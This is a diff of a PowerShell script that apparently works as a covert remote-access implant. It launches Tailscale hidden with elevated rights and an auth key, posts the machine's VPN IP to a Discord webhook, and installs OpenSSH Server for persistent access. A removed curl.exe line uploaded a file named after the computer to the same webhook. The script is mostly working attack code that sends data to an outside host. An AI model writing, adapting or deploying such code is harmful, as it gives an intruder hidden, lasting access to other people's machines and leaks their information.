@@ -83,7 +83,10 @@ Start-Sleep 1
 Start-Process -FilePath "C:\Tailscale\tailscale.exe" -windowstyle hidden -Verb RunAs -ArgumentList "up --authkey $authKey --unattended"
 
 ## Sends Discord Webhook
-# FIXME: Message isn't beeing send
+
+# FIXME: IP isn't beeing send to Webhook 
+# Mabye Adapter Name is wrong or Adapter doesn't exist at this point
+
 $ip = (Get-NetIPAddress -AddressFamily IPv4 -AddressState Preferred -InterfaceAlias "Tailscale").IPAddress 
 
 $description = @"
@@ -101,7 +104,6 @@ $payload = @{
   'content'  = $description
 }
 Invoke-RestMethod -Uri $Webhook -Method Post -Body $payload;
-curl.exe -F "file1=@./$env:computername.fk" $Webhook
 
 ## Enable persistent SSH
 Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
